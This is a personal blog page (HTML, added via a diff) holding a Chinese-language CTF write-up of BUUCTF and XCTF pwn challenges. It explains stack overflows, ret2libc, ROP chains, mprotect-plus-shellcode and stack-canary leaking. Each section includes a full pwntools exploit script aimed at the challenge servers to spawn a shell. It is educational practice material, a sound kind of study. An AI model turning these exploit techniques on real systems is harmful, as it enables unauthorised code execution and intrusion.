@@ -1,0 +1,1947 @@
+
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+    <meta charset="utf-8" />
+    <title>Buu刷题记录 | SpongeBobの pineapple house</title>
+    <meta name="author" content="SpongeBob" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+    <!-- 点击火花特效 -->
+    <canvas 
+        id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
+    </canvas>
+    
+    <!-- 流星背景-->
+    <canvas 
+        id="background" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1">
+    </canvas>
+    <script src="/js/background.min.js"></script>
+    
+    <!-- 鼠标指针特效-->
+    <div id="cursor"></div>
+    <link rel="stylesheet" href="/css/cursor.min.css" />
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>SPONGEBOBの PINEAPPLE HOUSE</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;SPONGEBOBの PINEAPPLE HOUSE</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Buu刷题记录</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/9/5
+        </span>
+        
+        <span class="category">
+            <a href="/categories/pwn/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                pwn
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/ctf/" style="color: #ff7d73">
+                    ctf
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #00bcd4">
+                    pwn
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="jarvisoj-level2-x64（2025-8-10）"><a href="#jarvisoj-level2-x64（2025-8-10）" class="headerlink" title="jarvisoj_level2_x64（2025.8.10）"></a>jarvisoj_level2_x64（2025.8.10）</h1><p>看上去是个很简单的栈溢出，有<code>system</code>函数，也有字符串<code>/bin/sh</code></p>
+<span id="more"></span>
+
+<pre><code class="language-shell">Arch:       amd64-64-little
+RELRO:      No RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+Stripped:   No
+</code></pre>
+<p>什么保护也没开，直接溢出就行</p>
+<pre><code class="language-python">from pwn import *
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:26368&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+
+POST = int(POST)
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+p.recvuntil(b&quot;Input:&quot;)
+pop_rdi_ret_addr = 0x4006b3
+bin_sh = 0x600a90
+system_addr = elf.sym[&#39;system&#39;]
+payload = b&#39;A&#39; * 0x88 + p64(pop_rdi_ret_addr) + p64(bin_sh) + p64(system_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>其中用到了ROPgadget，readelf这些工具，其实在IDA里也能直接看，无所谓了</p>
+<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>方法一：<br>这也是我最开始的思路，但是我没做出来。后门函数是<code>get_flag</code>，按理是栈溢出直接返回就行，这里是32位程序，得研究一下这里函数传参的栈溢出返回的具体实现，即参数入栈顺序和栈上结构。</p>
+<p>我直接传了：<code>get_flag_addr + argc1 + argc2</code></p>
+<p>查了一些资料，发现实际上是需要同时传递返回地址的，即：<br><code>get_flag_addr + exit_addr + argc1 + argc2</code></p>
+<pre><code class="language-python">from pwn import *
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuo
+
+j.cn:27954&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+
+POST = int(POST)
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+get_flag_addr= 0x080489a0
+a1 = 0x308CD64F
+a2 = 0x195719D1
+exit_addr = 0x804e6a0
+payload = 0x38 * b&#39;a&#39; + p32(get_flag_addr) + p32(exit_addr) + p32(a1) + p32(a2)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>方法二：<br>在栈上写<code>shellcode</code>实现控制。这个要求比较高，需要用<code>mprotect</code>函数，以及能够成功在栈上写<code>system(&#39;/bin/sh</code>)才行</p>
+<pre><code class="language-python">from pwn import *
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:27030&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+
+POST = int(POST)
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+mprotect_addr = 0x0806EC80
+write_addr = 0x0806E1B0
+read_addr = 0x0806E140
+bss_addr = 0x080Eb000
+length = 0x2000
+shellcode = asm(shellcraft.sh())
+# gdb.attach(p)
+pop_3_ret = 0x0804f460
+#----------mprotect(bss_addr, len, PROC_EXEC)-----------#
+
+# payload = b&#39;a&#39; * 0x38 + p32(mprotect_addr) + p32(read_addr) + argc1 + argc2 + argc3 + bss_addr + ......
+payload = 0x38 * b&#39;A&#39; + p32(mprotect_addr) + p32(pop_3_ret) + p32(bss_addr) + p32(length) + p32(0x7) 
+payload += p32(read_addr) + p32(bss_addr+0x1000) + p32(0) + p32(bss_addr + 0x1000) + p32(len(shellcode)) 
+p.sendline(payload)q
+p.sendline(shellcode)
+p.interactive()
+</code></pre>
+<p>这里主要是：32位可执行性程序调用函数是需要通过栈传递参数的，需要连续调用函数的时候，就需要通过<code>pop</code>链将之前栈上的参数手动清空，不然会出现错。上面注释掉的地方就是错误的做法</p>
+<h1 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h1><p>x86_64</p>
+<pre><code class="language-python">from pwn import *
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:26109&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+
+POST = int(POST)
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+system = elf.sym[&#39;system&#39;]
+bin_sh = next(elf.search(&#39;/bin/sh&#39;))
+pop_rdi_ret = 0x400683
+payload = b&#39;a&#39; * 0x18 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>一个64位的程序。非常简单的一个栈溢出，简单rop就搞定了</p>
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>32位程序</p>
+<pre><code class="language-python">from pwn import *
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:29983&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;libc-2.23.so&#39;)
+
+main_addr = 0x08048825
+pop_3_ret = 0x080488f9
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+open_got = elf.got[&#39;open&#39;]
+payload1 = b&#39;\x00&#39; + b&#39;\xff&#39; * (0x20-2)
+p.sendline(payload1)
+p.recvuntil(&#39;Correct\n&#39;)
+
+payload2 = b&#39;a&#39; * (0xe7+0x4) + p32(write_plt) + p32(pop_3_ret) + p32(0x1) + p32(write_got) + p32(0x4) + p32(write_plt) + p32(main_addr) +p32(0x1) + p32(open_got) + p32(0x4)
+p.sendline(payload2)
+# gdb.attach(p)
+write_addr = u32(p.recv(4).strip().ljust(4, b&#39;\x00&#39;))
+open_addr = u32(p.recv(4).strip().ljust(4, b&#39;\x00&#39;))
+print(hex(write_addr))
+print(hex(open_addr))
+libc_addr = write_addr - libc.sym[&#39;write&#39;]
+system_addr = libc_addr + libc.sym[&#39;system&#39;]
+bin_sh = libc_addr + next(libc.search(b&#39;/bin/sh&#39;))
+p.sendline(payload1)
+payload2 = b&#39;a&#39; * (0xe7+0x4) + p32(system_addr) +p32(0x0) + p32(bin_sh)
+p.recvuntil(b&#39;Correct\n&#39;)
+p.sendline(payload2)
+
+p.interactive()
+</code></pre>
+<p>一个<code>ret2libc</code>，题目给了libc库，所以就直接用远程的打了。整个逻辑简单。这道题主要学到的是如何绕过<code>strlen()</code></p>
+<p>![[截屏2025-08-12 14.37.45.png]]<br>这里为了防止程序提前退出，必须绕过<code>strncmp</code>，这里可以选择想办法让<code>v1</code>&#x3D;0，从而让这个函数返回0。因为<code>dev_urandom</code>是系统生成的随机数，我们无法知道其值，从而输入<code>\x00</code>开头的字符串，使得<code>strlen</code>判断其为0。<code>strlen</code>遇到<code>\x00</code>会停下来。</p>
+<blockquote>
+<p>PS：<code>read</code>函数并不会遇到某些字符就停下来，他会一直读取到指定的字节数。</p>
+</blockquote>
+<h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>x86_64<br>![[Pasted image 20250812151945.png]]</p>
+<p>程序中没有<code>system</code>和<code>/bin/sh</code>，可以找<code>libc</code>手打ROP。当然，<code>checksec</code>发现程序并没有开启<code>NX</code>，所以完全可以在<code>read(0, name, 0x64)</code>的时候写入一段shellcode。</p>
+<p>方法一：<code>ret2libc</code></p>
+<pre><code class="language-python">from pwn import *
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:26981&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+p.recvline()
+payload_useless = b&#39;a&#39; * 0x63
+p.sendline(payload_useless)
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+gets_got = elf.got[&#39;gets&#39;]
+
+pop_rdi_ret = 0x400713
+main_addr = 0x400636
+p.recvline()
+p.recvline()
+payload = b&#39;A&#39; * 0x28 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(main_addr)
+p.sendline(payload)
+
+puts_addr = u64(p.recvline()[0:6].strip().ljust(8, b&#39;\x00&#39;))
+gets_addr = u64(p.recvline()[0:6].strip().ljust(8, b&#39;\x00&#39;))
+print(hex(puts_addr))
+print(hex(gets_addr))
+
+libc_addr = puts_addr - 0x809c0
+system = libc_addr + 0x4f440
+bin_sh = libc_addr + 0x1b3e9a
+p.recvline()
+payload_useless = b&#39;a&#39; * 20
+p.sendline(payload_useless)
+p.recvline()
+p.recvline()
+payload = b&#39;a&#39; * 0x28 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>也是一个<code>ret2libc</code>。这里是原程序第一步<code>read(0, &amp;buf, 0x64)</code>，然后<code>sendline(payload)</code>的时候不能是0x64，一定要小于这个数，具体是为什么也不清楚。</p>
+<p>方法2:</p>
+<p>在<code>name</code>处写上一段<code>shellcode</code></p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:26981&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+p.recvline()
+ret = 0x4004c9
+shellcode = asm(shellcraft.sh())
+p.sendline(shellcode)
+p.recvline()
+p.recvline()
+name_addr = 0x601080
+payload = b&#39;a&#39; * 0x28 + p64(ret) + p64(name_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>我远程没打通，按理应该是可以的。可能是题的问题，注意要把<code>context.arch</code>改为和程序一样的。看下程序<code>checksec &lt;file_name&gt;</code>架构是<code>amd64-64-little</code>的。</p>
+<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p><del>32位程序，静态链接。先用<code>checksec</code>查看一下文件保护情况，只开启了<code>NX</code>，无法用<code>shellcode</code>，但是<code>ROP</code>是可以的，并且<code>IDA</code>反编译之后有<code>gets</code>，而且是静态链接，甚至不用<code>libc</code>，一眼简单题，开始尝试。</del></p>
+<p><del>没有<code>system</code>，没有<code>/bin/sh</code>，好像不好搞shell，但是发现字符串里面有<code>flag.txt</code>，调用个链<code>open -&gt; read -&gt; write</code>?程序里正好有这三个函数，目前思路是这样，尝试下。</del></p>
+<p>太粗心了，没看到有后门函数，那就不用构造<code>orw</code>了，但按理也行应该（）</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+Local = True
+# Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:29895&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+# p.recvline()
+get_secret = 0x080489A0
+write = 0x0806e270
+bss_addr = 0x080ECA2D
+gdb.attach(p)
+#-----open(&#39;flag.txt&#39;)-----#
+payload = b&#39;a&#39; * 0x2d + p32(get_secret) + p32(write) + p32(bss_addr) + p32(1) + p32(bss_addr) + p32(0x50)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p>64位，动态链接程序<br>保护情况</p>
+<pre><code class="language-bash">spongebob@spongebob:~/Document/pwn$ checksec pwn
+[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+</code></pre>
+<p>开启了栈执行保护，先不考虑bss</p>
+<p>动态链接调<code>system(&#39;/bin/sh&#39;)</code>试试吧</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:27536&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+p.recvline(b&quot;Input your choice!&quot;)
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+gets_got = elf.got[&#39;gets&#39;]
+encrypt = 0x4009A0
+pop_rdi_ret = 0x400c83
+
+p.sendline(b&#39;1&#39;)
+p.recvuntil(b&quot;Input your Plaintext to be encrypted&quot;)
+
+# gdb.attach(p)
+
+payload = b&#39;\x00&#39; + b&#39;a&#39; * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(encrypt)
+p.sendline(payload)
+p.recvuntil(b&quot;Ciphertext\n&quot;)
+p.recvline()
+puts_addr = u64(p.recvline()[0:6].strip().ljust(8, b&#39;\x00&#39;))
+gets_addr = u64(p.recvline()[0:6].strip().ljust(8, b&#39;\x00&#39;))
+
+print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)
+print(f&quot;gets_addr: &#123;hex(gets_addr)&#125;&quot;)
+
+#--------step-2---------#
+
+libc_addr = puts_addr - 0x809c0
+system = libc_addr + 0x4f440
+bin_sh = libc_addr + 0x1b3e9a
+
+payload = b&#39;\x00&#39; + b&#39;a&#39; * 0x57 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+p.recvuntil(b&#39;Input your Plaintext to be encrypted&#39;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>这里做的时候一直在取地址的时候出现问题：</p>
+<pre><code class="language-python">p.recvuntil(b&quot;Ciphertext\n&quot;)
+p.recvline()                 # 加了这一句才解决
+puts_addr = u64(p.recvline()[0:6].strip().ljust(8, b&#39;\x00&#39;))
+gets_addr = u64(p.recvline()[0:6].strip().ljust(8, b&#39;\x00&#39;))
+
+print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)
+print(f&quot;gets_addr: &#123;hex(gets_addr)&#125;&quot;)
+</code></pre>
+<p>原因是，覆盖返回地址覆盖的是<code>puts(s)</code>的返回地址，<code>puts(s)</code>本身是会有东西输出了，所以要多收一行。</p>
+<h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h1><p>32位置，动态链接<br>保护情况：</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+</code></pre>
+<p>无法用<code>bss</code>直接写了，我在这个题没找到栈溢出的地方（（（<br>不过有<code>system</code>函数</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;node5.buuoj.cn:28162&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+
+elf = ELF(&#39;./pwn&#39;)
+system = elf.sym[&#39;system&#39;]
+sh = 0x080482ea
+passwd = b&quot;administrator&quot;
+p.recvuntil(b&quot;password:&quot;)
+p.sendline(passwd)
+p.recvuntil(b&quot;0.Exit&quot;)
+p.recvuntil(b&quot;:&quot;)
+p.sendline(b&#39;1&#39;)
+p.recvuntil(b&quot;Please input new log info:&quot;)
+payload = 0x4c * b&#39;a&#39; + p32(system) + b&#39;aaaa&#39; + p32(sh)
+p.sendline(payload)
+p.sendline(b&#39;4&#39;)
+p.interactive()
+</code></pre>
+<p>具体利用原理在于：<br>![[Pasted image 20250818120003.png]]<br>这里src只有48字节大小，但是在<code>AddLog</code>里面可以输入128字节，可以构造栈溢出，然后在<code>GetFlag</code>里面利用。因为<code>GetFlag</code>里面会返回可控的地址。</p>
+<h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p>简单的ROP，泄露<code>libc</code>就可以了。</p>
+<h1 id="pwn1-xctf"><a href="#pwn1-xctf" class="headerlink" title="pwn1(xctf)"></a>pwn1(xctf)</h1><p>64位动态链接，有Canary保护（第一次接触Canary保护的题目）</p>
+<pre><code class="language-bash">[*] &#39;/home/spongebob/Document/pwn/pwn&#39;
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+</code></pre>
+<p>先换一下动态链接器和共享库：</p>
+<pre><code class="language-bash">patchelf --replace-needed libc.so.6 /home/spongebob/Document/pwn/libc-2.23.so pwn
+
+patchelf --set-interpreter /home/spongebob/Document/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so pwn
+</code></pre>
+<p><code>puts</code>遇到回车不会停，遇到<code>\x00</code>才会停，因此可以覆盖掉<code>canary</code>的最低位，然后打印出整个<code>canary</code>并且补全就行。</p>
+<pre><code class="language-python">from pwn import *
+context.arch=&#39;amd64&#39;
+# Local = True
+Local = False
+# context.log_level=&quot;debug&quot;
+context.terminal = [&quot;tmux&quot;, &quot;split-window&quot;, &quot;-h&quot;, &quot;-p&quot;, &quot;70&quot;]
+url = &quot;61.147.171.105:60635&quot;
+
+HOST, POST = url.split(&quot;:&quot;)
+POST = int(POST)
+
+if Local:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(HOST, POST)
+    
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;./libc-2.23.so&#39;)
+pop_rdi_ret = 0x400a93
+puts_got = elf.got[&#39;puts&#39;]
+puts_plt = elf.plt[&#39;puts&#39;]
+main = 0x400908
+
+# gdb.attach(p)
+#-------泄漏canary-------#
+p.recvuntil(b&#39;&gt;&gt; &#39;)
+p.sendline(b&#39;1&#39;)
+payload = 0x88 * b&#39;a&#39;
+p.sendline(payload)
+p.recvuntil(b&#39;&gt;&gt; &#39;)
+p.sendline(b&#39;2&#39;)
+p.recvuntil(0x88 * b&#39;a&#39; + b&#39;\n&#39;)
+# canary = u64(p.recv(7).strip().rjust(8, b&#39;x\x00&#39;))
+canary = p.recv(7)
+canary = b&#39;\x00&#39; + canary
+canary = u64(canary)
+print(f&quot;canary: &#123;hex(canary)&#125;&quot;)
+#-------泄漏libc--------#
+p.recvuntil(b&#39;&gt;&gt; &#39;)
+p.sendline(b&#39;1&#39;)
+payload = 0x88 * b&#39;a&#39; + p64(canary) + b&#39;a&#39; * 8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
+p.sendline(payload)
+p.sendafter(b&#39;&gt;&gt; &#39;, b&#39;3&#39;)
+puts_addr = u64(p.recv(6).strip().ljust(8, b&#39;\x00&#39;))
+print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)
+libc_addr = puts_addr - libc.sym[&#39;puts&#39;]
+system = libc_addr + libc.sym[&#39;system&#39;]
+bin_sh = libc_addr + 0x18c177
+one_gadget = libc_addr + 0x45216
+print(f&quot;system_addr: &#123;hex(system)&#125;&quot;)
+print(f&quot;binsh_addr: &#123;hex(bin_sh)&#125;&quot;)
+
+#--------泄露新的canary--------#
+p.recvuntil(b&#39;&gt;&gt; &#39;)
+p.sendline(b&#39;1&#39;)
+payload = 0x88 * b&#39;a&#39;
+p.sendline(payload)
+p.recvuntil(b&#39;&gt;&gt; &#39;)
+p.sendline(b&#39;2&#39;)
+p.recvuntil(0x88 * b&#39;a&#39; + b&#39;\n&#39;)
+# canary = u64(p.recv(7).strip().rjust(8, b&#39;x\x00&#39;))
+canary = p.recv(7)
+canary = b&#39;\x00&#39; + canary
+canary = u64(canary)
+print(f&quot;canary: &#123;hex(canary)&#125;&quot;)
+
+#--------ROP获得shell--------#
+p.recvuntil(b&#39;&gt;&gt; &#39;)
+p.sendline(b&#39;1&#39;)
+payload = 0x88 * b&#39;a&#39; + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+payload = 0x88 * b&#39;a&#39; + p64(canary) + b&#39;a&#39; * 0x8 + p64(one_gadget)
+p.sendline(payload)
+p.sendafter(b&#39;&gt;&gt; &#39;, b&#39;3&#39;)
+p.interactive()
+</code></pre>
+<p>我的<code>exp</code>里泄露了两次<code>canary</code>，我以为重新返回<code>main</code>后canary会更新。这个是我从<code>canary</code>的原理是自己理解的。但实际上从汇编调用可以知道，返回<code>main</code>后仍然将<code>var_8</code>和<code>fs+0x28</code>进行比较，<code>var_8</code>在这个过程并没有发生改变。</p>
